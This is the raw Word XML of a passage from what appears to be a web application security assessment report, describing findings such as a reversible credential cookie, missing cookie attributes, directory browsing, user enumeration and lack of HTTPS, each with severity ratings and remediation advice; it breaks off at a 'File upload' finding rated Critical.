      <w:r w:rsidR="00ED3417" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(Muscat, 2021)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2639CF8B" w14:textId="77777777" w:rsidR="00FB2E5B" w:rsidRDefault="00FB2E5B" w:rsidP="00790807">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B284CF0" w14:textId="680C8B57" w:rsidR="0091492F" w:rsidRDefault="002E765C" w:rsidP="002E765C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E765C">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Reversible cookie </w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="4526" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2263"/>
        <w:gridCol w:w="2263"/>
      </w:tblGrid>
      <w:tr w:rsidR="00703BCF" w14:paraId="1A225B75" w14:textId="77777777" w:rsidTr="007F6196">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2263" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="761E28" w:themeFill="accent2" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="26BD3614" w14:textId="78333F5E" w:rsidR="00703BCF" w:rsidRDefault="00703BCF" w:rsidP="00703BCF">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2263" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
          </w:tcPr>
          <w:p w14:paraId="04457794" w14:textId="6E1495A1" w:rsidR="00703BCF" w:rsidRDefault="00703BCF" w:rsidP="00703BCF">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Easy</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="444A77E0" w14:textId="77777777" w:rsidR="00703BCF" w:rsidRPr="00703BCF" w:rsidRDefault="00703BCF" w:rsidP="00703BCF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4EC5E244" w14:textId="727CE222" w:rsidR="0091492F" w:rsidRPr="00292DEC" w:rsidRDefault="00804A22" w:rsidP="00790807">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>This vulnerability seems needless as the cookie that it is present in serves no purpose. The cookie is generated after the user logs in and contains their credentials in an insecure manner. This allows a malicious user to reverse the encryption on the cookie and gain the users username and password in plain text.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BFC394C" w14:textId="0A76C64B" w:rsidR="00804A22" w:rsidRPr="00292DEC" w:rsidRDefault="00804A22" w:rsidP="00790807">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Since this cookie does not preform a required task it is recommended that it be removed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF2E305" w14:textId="331B6595" w:rsidR="007F6506" w:rsidRDefault="000620CA" w:rsidP="00B16117">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007F6506">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Cookie attributes </w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2126"/>
        <w:gridCol w:w="2126"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FB2E5B" w14:paraId="671230A1" w14:textId="77777777" w:rsidTr="007F6196">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="B35E06" w:themeFill="accent1" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="258DC148" w14:textId="7159ABFC" w:rsidR="00FB2E5B" w:rsidRDefault="00FB2E5B" w:rsidP="00FB2E5B">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
          </w:tcPr>
          <w:p w14:paraId="47FD9A38" w14:textId="72078532" w:rsidR="00FB2E5B" w:rsidRDefault="00FB2E5B" w:rsidP="00FB2E5B">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Easy</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3D14C2F2" w14:textId="77777777" w:rsidR="00703BCF" w:rsidRPr="00703BCF" w:rsidRDefault="00703BCF" w:rsidP="00703BCF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F3A67D1" w14:textId="0C80ABF2" w:rsidR="000620CA" w:rsidRPr="00292DEC" w:rsidRDefault="00DF15E1" w:rsidP="007F6506">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">The cookies on this site </w:t>
      </w:r>
      <w:r w:rsidR="007F6506" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">do not have attributes set which can provide many problems to the security of the website. For example, without the “HTTPOnly” attribute it is possible to use Cross Sight Scripting on the site. The “Secure” attribute means that </w:t>
      </w:r>
      <w:r w:rsidR="00DA638E" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">the cookie will only be sent across encrypted connections, preventing sniffing of the cookie and thereby reducing the risk of it being captured by a malicious user. </w:t>
      </w:r>
      <w:r w:rsidR="007F6506" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Without the “Expires” attribute a user will never be automatically logged out and therefore if an attacker gains access all they need to do is keep the session open and they will retain access.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6644F4C2" w14:textId="6401BC91" w:rsidR="007F6506" w:rsidRPr="00292DEC" w:rsidRDefault="00DA638E" w:rsidP="007F6506">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>These can</w:t>
      </w:r>
      <w:r w:rsidR="007F6506" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> be easily set</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>up for the session cookie where it should include:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190B5D29" w14:textId="32D45F81" w:rsidR="00DA638E" w:rsidRPr="00292DEC" w:rsidRDefault="00DA638E" w:rsidP="00DA638E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>HTTPOnly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1860B155" w14:textId="6766EC8E" w:rsidR="00DA638E" w:rsidRPr="00292DEC" w:rsidRDefault="00DA638E" w:rsidP="00DA638E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Secure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728DE9B6" w14:textId="3A85A594" w:rsidR="00292DEC" w:rsidRDefault="00DA638E" w:rsidP="00DA638E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Expires</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="342DE6C6" w14:textId="77777777" w:rsidR="00292DEC" w:rsidRDefault="00292DEC">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AFA4FC8" w14:textId="1827CE4C" w:rsidR="00790807" w:rsidRDefault="002E765C" w:rsidP="002E765C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E765C">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Directory browsing </w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2126"/>
        <w:gridCol w:w="2126"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FB2E5B" w14:paraId="7397E3CA" w14:textId="77777777" w:rsidTr="007F6196">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="4DA4D8" w:themeFill="accent3" w:themeFillTint="99"/>
          </w:tcPr>
          <w:p w14:paraId="63676787" w14:textId="4A2D3705" w:rsidR="00FB2E5B" w:rsidRDefault="00FB2E5B" w:rsidP="00FB2E5B">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
          </w:tcPr>
          <w:p w14:paraId="78C9DFB4" w14:textId="06A42D38" w:rsidR="00FB2E5B" w:rsidRDefault="00FB2E5B" w:rsidP="00FB2E5B">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Easy</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4A21F4E1" w14:textId="77777777" w:rsidR="00FB2E5B" w:rsidRPr="00FB2E5B" w:rsidRDefault="00FB2E5B" w:rsidP="00FB2E5B">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D2C57EF" w14:textId="6ADA09C9" w:rsidR="002E765C" w:rsidRPr="00292DEC" w:rsidRDefault="00CD2DF1" w:rsidP="002E765C">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Because Directory Browsing is enabled it is possible to traverse the files contained within the server. </w:t>
      </w:r>
      <w:r w:rsidR="00FA4300" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">This means that malicious users can look for files with names that may indicate they contain sensitive information. </w:t>
      </w:r>
      <w:r w:rsidR="00FB2E5B" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">This is particularly useful to attackers as it allows for the spidering of the host system. </w:t>
      </w:r>
      <w:r w:rsidR="00C37CB8" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Accessing this </w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">sensitive data </w:t>
      </w:r>
      <w:r w:rsidR="00C37CB8" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">could be sold on </w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">or </w:t>
      </w:r>
      <w:r w:rsidR="00C37CB8" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>used</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> to further compromise the system. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6556FAAF" w14:textId="624F71E0" w:rsidR="00C37CB8" w:rsidRPr="00292DEC" w:rsidRDefault="00C37CB8" w:rsidP="002E765C">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">This </w:t>
      </w:r>
      <w:r w:rsidR="00801808" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>is a setting that can be configured and should be disabled in the server settings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE56CED" w14:textId="43A4999A" w:rsidR="002E765C" w:rsidRDefault="002E765C" w:rsidP="002E765C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E765C">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>User enumeration</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2126"/>
        <w:gridCol w:w="2126"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FB2E5B" w14:paraId="15E7FAD5" w14:textId="77777777" w:rsidTr="007F6196">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="B35E06" w:themeFill="accent1" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="65A96603" w14:textId="100BABB7" w:rsidR="00FB2E5B" w:rsidRDefault="00FB2E5B" w:rsidP="00FB2E5B">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
          </w:tcPr>
          <w:p w14:paraId="34A415E0" w14:textId="4D9EF1A7" w:rsidR="00FB2E5B" w:rsidRDefault="00FB2E5B" w:rsidP="00FB2E5B">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Easy</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1CA57A2C" w14:textId="77777777" w:rsidR="00FB2E5B" w:rsidRPr="00292DEC" w:rsidRDefault="00FB2E5B" w:rsidP="00FB2E5B">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48FDEBE2" w14:textId="69859182" w:rsidR="002E765C" w:rsidRPr="00292DEC" w:rsidRDefault="00A520BF" w:rsidP="002E765C">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">The ability to enumerate users is not a vulnerability in and of itself. However, by retrieving a list of usernames the attacker </w:t>
      </w:r>
      <w:r w:rsidR="007C07C9" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>can then use this information in other attacks. For example, with a list of real usernames an attacker could then attempt to guess the passwords of those users and there</w:t>
      </w:r>
      <w:r w:rsidR="00614878" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">by gain unauthorised access to their account. Alternatively, this information could be used to spoof forms on the </w:t>
      </w:r>
      <w:r w:rsidR="00F10A54" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>web application in order to impersonate other users.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="454F309A" w14:textId="36C39332" w:rsidR="00A520BF" w:rsidRPr="00292DEC" w:rsidRDefault="00F10A54" w:rsidP="00DA638E">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">While the uses for this are numerus, the </w:t>
      </w:r>
      <w:r w:rsidR="00267031" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">solution is singular. To prevent further breaches from this vulnerability it will be necessary to </w:t>
      </w:r>
      <w:r w:rsidR="009E2FC9" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">change the notification when a login attempt fails to something that is the same regardless of the </w:t>
      </w:r>
      <w:r w:rsidR="00DD5095" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>input.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C9B2E6" w14:textId="2AC74A7F" w:rsidR="002E765C" w:rsidRDefault="002E765C" w:rsidP="002E765C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E765C">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>No HTTPS</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2126"/>
        <w:gridCol w:w="2126"/>
      </w:tblGrid>
      <w:tr w:rsidR="003B6447" w14:paraId="28875160" w14:textId="77777777" w:rsidTr="007F6196">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="761E28" w:themeFill="accent2" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="2D151921" w14:textId="316B78CB" w:rsidR="003B6447" w:rsidRDefault="003B6447" w:rsidP="003B6447">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
          </w:tcPr>
          <w:p w14:paraId="37A3F8AA" w14:textId="09C6DCE6" w:rsidR="003B6447" w:rsidRDefault="003B6447" w:rsidP="003B6447">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Easy</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3A81BAC3" w14:textId="77777777" w:rsidR="00FB2E5B" w:rsidRPr="00FB2E5B" w:rsidRDefault="00FB2E5B" w:rsidP="00FB2E5B">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72421D2E" w14:textId="2FB7C016" w:rsidR="002E765C" w:rsidRPr="00292DEC" w:rsidRDefault="00225A89" w:rsidP="002E765C">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>When HTTPS is used for communicating between the server and users it ensures that all data is sent in an encrypted format which only the recipient has the key for. However, when this is not used, as is the case for this website, all data is transferred in a readable format that an attacker can capture and extract important details from such as login information or bank details.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3750CE01" w14:textId="031502EA" w:rsidR="00292DEC" w:rsidRDefault="00225A89" w:rsidP="002E765C">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">In order to set this up it will require an SSL certificate that can be used to set up the secure connection to users. Once this has been purchased and installed on the server user browsers should automatically use it </w:t>
      </w:r>
      <w:r w:rsidR="00A4435D" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>to secure the connection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581D88F9" w14:textId="77777777" w:rsidR="00292DEC" w:rsidRDefault="00292DEC">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CFB22B0" w14:textId="0305CC5B" w:rsidR="002E765C" w:rsidRDefault="002E765C" w:rsidP="002E765C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E765C">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>File upload</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2127"/>
        <w:gridCol w:w="2127"/>
      </w:tblGrid>
      <w:tr w:rsidR="003B6447" w14:paraId="49215B72" w14:textId="77777777" w:rsidTr="007F6196">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2127" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0D0D0D" w:themeFill="text1" w:themeFillTint="F2"/>
          </w:tcPr>
          <w:p w14:paraId="247A4840" w14:textId="604D27F1" w:rsidR="003B6447" w:rsidRDefault="003B6447" w:rsidP="003B6447">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2127" w:type="dxa"/>
